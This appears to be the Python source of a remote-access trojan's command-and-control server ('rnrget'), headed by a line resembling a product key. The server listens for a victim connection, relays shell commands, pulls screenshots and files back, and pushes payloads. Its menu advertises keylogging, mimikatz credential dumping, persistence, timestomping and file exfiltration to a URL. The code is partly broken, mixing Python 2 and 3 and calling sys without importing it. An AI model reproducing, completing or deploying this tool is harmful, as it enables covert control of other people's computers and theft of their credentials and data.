QW4HD DQCRG HM64M 6GJRK 8K83T

### server
#!/usr/bin/env python

import socket
import os
import datetime

global host
global port
global s
host = '10.0.0.1'
port = 9999
s = socket.socket()
def create():
    try:
        global s
        s = socket.socket()
    except socket.error as msg:
        print("Error: " + str(msg))


def bind():
    try:
        print("Listening on port " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Error: " + str(msg))
        bind()


def accept():
    conn, address = s.accept()
    print("New client connection established: IP " + address[0] + " Port: " + str(address[1]))
    ssend(conn)
    conn.close()

def ssend(conn):
    while True:
        cmd = raw_input("rnrget> ")
        args = cmd.split()
        if len(cmd) < 1:
            continue
        elif cmd == 'quit' or cmd == 'exit':
            conn.send('goodbye!')
            conn.close()
            s.close()
            sys.exit()
        elif cmd == 'clear' or cmd == 'cls':
            os.system('clear')
        elif cmd == '?' or cmd == '/?' or cmd == 'help' or cmd == '-h':
            menu()
        elif(cmd == 'screencap'):
            conn.send(cmd.encode())
            data = b''
            while True:
                p = conn.recv(4096)
                data += p
                if len(p) < 4096:
                    break
            dt = str(datetime.datetime.now())
            filename = dt + '.jpg'
            f = open(filename,'wb')
            f.write(data)
            f.close()
            print("Operation Complete: screencap has been saved in handler directory as " + filename)
        elif(args[0] == 'getfile'):
            conn.send(cmd.encode())
            data = b''
            while True:
                p = conn.recv(4096)
                data += p
                if len(p) < 4096:
                    break
            filename = args[2]
            f = open(filename, 'wb')
            f.write(data)
            f.close()
            print("Operation Complete: file has been saved as " + filename)
        elif(args[0] == 'drop'):
             conn.send('drop ' + str(os.path.getsize(args[1])))
             resp = conn.recv(1024)
             if resp[:5].decode("utf-8") == 'ready':
                f = open(args[1],'r')
                data = f.read(1024)
                while (data):
                    conn.send(data)
                    data = f.read(1024)
                f.close()
                print('\nPAYLOAD SENT.')
        else:
           conn.send(str.encode(cmd))
           data = b''
           while True:
                client_response = str(conn.recv(4096))
                data += client_response
                if len(client_response) < 4096:
                    break
           print(data)
def main():
        art()
        menu()
        create()
        bind()
        accept()


def menu():
        print("command      description                 example");
        print("-------      -----------                 ------");
        print("help         display help menu           help, /?, ?");
        print("arch         create zip file from dir    arch <source path> <destination path>, arch C:\\Users\\srcdir C:\\Users\\dest.zip");
        print("cp           copy files                  cp <source path> <destination path>, cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
        print("del          delete files                del <target path>, del C:\\Users\\Admin\\targetfile.txt");
        print("deldir       delete directory            deldir <target path>, deldir C:\\Users\\Admin\\Directory");
        print("drop         drop payloads               drop <path> <URI>, dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
        print("envar        get environmental vars      envar");
        print("list         enumerate files             enumdir <target dir>, enumdir C:\\Users\\Admin\\Desktop");
        print("getfile      grab files                  getfile <target path> <local download path>, getfile C:\\Users\\Admin\\passwords.txt /usr/root/Desktop/passwords.txt");
        print("grep         case sensisitive grep       grep <pattern> <path>, grep foo bar.txt");
        print("hostinfo     get host information        hostinfo");
        print("keylog       log key strokes             keylog");
        print("mimi         invoke-mimikatz             mimi");
        print("mv           move files                  mv <source> <destination>, mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
        print("mkdir        create directory            mkdir <target dir>, mkdir C:\\Users\\Admin\\NewDir");
        print("persist      pick yo persistence         persist logonscript or startup or schtask");
        print("ps           get process listing         ps");
        print("pwd          print working directory     pwd");
        print("cat          read text from file         cat <target path>, cat C:\\Users\\Admin\\helloworld.txt");
        print("run          run processes               run <target path>, run calc.exe");
        print("runadmin     run processes as admin      runadmin <target path>, runadmin calc.exe");
        print("screencap    take screenshot             screencap <save path>, screencap C:\\Users\\REM\\Desktop\\screencap.bmp");
        print("shares       enumerate shares            shares");
        print("ts           timestomp                   ts <target path>, ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
        print("userinfo     get user information        userinfo");
        print("xfil         exfil files                 xfil <target path> <URI>, xfil C:\\Users\\Admin\\xfil.me, https://raw.githubusercontent.com/rnranalysis/xfiol.file")


def art():
    print("                                                     __     ");
    print("                                                    /  |    ");
    print("  ______   _______    ______    ______    ______   _$$ |_   ");
    print(" /      \\ /       \\  /      \\  /      \\  /      \\ / $$   | ");
    print("/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$/   ");
    print("$$ |  $$/ $$ |  $$ |$$ |  $$/ $$ |  $$ |$$    $$ |  $$ | __ ");
    print("$$ |      $$ |  $$ |$$ |      $$ \\__$$ |$$$$$$$$/   $$ |/  |");
    print("$$ |      $$ |  $$ |$$ |      $$    $$ |$$       |  $$  $$/ ");
    print("$$/       $$/   $$/ $$/        $$$$$$$ | $$$$$$$/    $$$$/  ");
    print("                              /  \\__$$ |                    ");
    print("                              $$    $$/                     ");
    print("                               $$$$$$/                      ");

main()
